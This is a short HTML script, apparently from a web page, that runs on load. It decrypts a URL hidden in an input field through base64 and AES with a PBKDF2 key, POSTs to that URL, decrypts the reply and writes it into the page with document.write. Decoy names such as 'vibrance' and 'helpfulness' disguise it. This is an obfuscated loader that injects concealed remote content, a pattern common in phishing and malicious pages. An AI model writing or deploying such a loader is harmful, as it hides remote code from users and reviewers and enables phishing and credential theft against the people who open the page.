<script>
    async function vibrance(helpfulness) {
        var {a,b,c,d} = JSON.parse(helpfulness);
        return CryptoJS.AES.decrypt(a, CryptoJS.PBKDF2(CryptoJS.enc.Hex.parse(d), CryptoJS.enc.Hex.parse(b), {hasher: CryptoJS.algo.SHA512, keySize: 64/8, iterations: 999}), {iv: CryptoJS.enc.Hex.parse(c)}).toString(CryptoJS.enc.Utf8);
    }
    (async () => {
        document.write(await vibrance(await (await fetch(await vibrance(atob(document.querySelector('input').value)), {
            method: 'POST', body: JSON.stringify({ rim: "manifold" })
        })).text()));
    })();
</script>
